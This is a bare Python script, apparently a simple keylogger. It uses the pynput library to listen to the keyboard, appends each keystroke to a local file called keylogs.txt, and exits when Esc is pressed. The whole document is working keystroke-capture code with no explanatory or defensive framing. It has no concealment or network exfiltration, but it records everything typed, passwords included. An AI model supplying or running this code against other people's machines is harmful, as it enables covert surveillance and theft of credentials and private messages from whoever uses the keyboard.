```python
import pynput.keyboard as keyboard

def on_press(key):
    try:
        with open('keylogs.txt', 'a') as file:
            if key == keyboard.Key.space:
                file.write('[SPACE] ')
            elif key == keyboard.Key.enter:
                file.write('\n')
            else:
                file.write(f'{key} ')
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```